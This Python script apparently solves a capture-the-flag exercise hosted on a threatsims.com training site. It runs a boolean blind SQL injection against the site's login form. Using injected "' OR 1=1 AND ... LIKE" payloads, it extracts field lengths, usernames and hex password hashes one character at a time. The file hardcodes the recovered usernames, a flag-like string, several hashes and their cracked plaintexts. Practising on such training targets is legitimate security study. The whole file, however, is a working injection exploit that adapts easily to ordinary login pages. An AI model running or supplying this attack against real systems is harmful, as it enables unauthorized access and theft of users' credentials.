from requests import post
from string import hexdigits, printable, ascii_lowercase, digits

URL = "http://joe-cv.threatsims.com/login"


def valid(username: str) -> bool:
    return "thanks for logging in".encode() in post(URL, data={"username": username, "password": ""}).content


def user_prefix_query(user: str, exact: bool = False) -> str:
    return f"' OR 1=1 AND username LIKE '{user}{'' if exact else '%'}'--'"


def pass_prefix_query(user: str, passwd: str, exact: bool = False) -> str:
    return f"' OR 1=1 AND username='{user}' AND password LIKE '{passwd}{'' if exact else '%'}'--'"


def len_query(var_name: str, L: int, exact: bool = False) -> str:
    return f"' OR 1=1 AND {var_name} LIKE '{L * '_'}{'' if exact else '%'}'--'"


def solve_len(var_name: str) -> int:
    for i in range(1024):
        if valid(len_query(var_name, i)) is False:
            assert valid(len_query(var_name, i - 1, exact=True)) is True
            return i - 1


def solve_user(max_len: int) -> list:
    users = []
    cur = ['derp{lookingfortigerishard']

    for i in range(len(cur[0]), max_len):
        users.extend([user for user in cur if valid(user_prefix_query(user, exact=True))])
        cur = [user for user in cur if len(user) == i]
        for user in cur:
            if len(user) > i:
                break
            print(user)
            for c in printable:
                if c in '%_': continue
                print(c, end='', flush=True)
                if valid(user_prefix_query(user + c)):
                    cur.append(user + c)
            print()
    return users


def solve_pass(usernames, pass_length: int) -> dict:
    passes = {
        "joe": "248b57c5cabbc9944d169d10bc4959a042d0bb81ab6cfc9166f40a9d0f0fd614",  # tigers (ans)
        "dillon": "67731ff58137eb39713ae30eba33c54c8c1d5418e081428ca815e4e733d64f6d",  # kitty
        "reinke": "6ec62e2d4ea3e23758b75ac8c0eb60cb49b0f8646caa862684e6782b9d55e7ec",
        "kirkham": "a0b4effeef833b97fd7035bfd2d35cf327f9c087f51738ac59a5d12432638a92",  #
    }
    for username in usernames:
        if username in passes:
            continue
        print(username)
        cur = ""
        for i in range(pass_length):
            for c in hexdigits:  # looks like hex
                print(c, end='', flush=True)
                if valid(pass_prefix_query(username, cur + c)):
                    cur += c
                    print(f'\n{username}:', cur)
                    break
            else:
                break
        print()

    return passes


if __name__ == "__main__":
    # pass_len = solve_len("password")
    # print(pass_len)
    # user_len = solve_len("username")
    # print(user_len)
    user_len = 27
    # usernames = solve_user(user_len)
    usernames = ['joe', 'antle', 'carole', 'dillon', 'reinke', 'kirkham', 'derp{lookingfortigerishard']
    print(usernames)
    pass_len = 64
    print(solve_pass(usernames, pass_len))

# 248b57c5cabbc9944d169d10bc4959a042d0bb81ab6cfc9166f40a9d0f0fd614 -> tigers
